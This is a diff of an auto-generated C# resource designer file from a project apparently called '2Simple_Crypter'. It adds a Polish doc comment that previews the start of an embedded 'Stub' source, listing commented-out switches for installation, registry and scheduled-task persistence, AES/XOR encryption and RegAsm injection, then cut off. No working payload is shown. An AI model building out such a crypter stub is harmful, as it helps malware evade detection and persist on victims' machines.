@@ -81,7 +81,32 @@ namespace _2Simple_Crypter.Properties {
         }
         
         /// <summary>
-        /// Wyszukuje zlokalizowany ciąg podobny do ciągu .
+        /// Wyszukuje zlokalizowany ciąg podobny do ciągu //#define INSTALL
+        /////#define REGEDIT
+        /////#define SCHTASKS
+        ///
+        /////#define AES
+        /////#define XOR
+        /////#define ITSELF
+        /////#define REGASM
+        ///
+        ///using System;
+        ///using System.ComponentModel;
+        ///using System.Diagnostics;
+        ///using System.IO;
+        ///using System.Reflection;
+        ///using System.Runtime.InteropServices;
+        ///using System.Security;
+        ///using System.Security.AccessControl;
+        ///using System.Security.Cryptography;
+        ///using System.Security.Principal;
+        ///using System.Text;
+        ///using System.Threading;
+        ///using System.Windows.Forms;
+        ///
+        ///namespace Stub
+        ///{
+        ///  [obcięto pozostałą część ciągu]&quot;;.
         /// </summary>
         internal static string Stub {
             get {
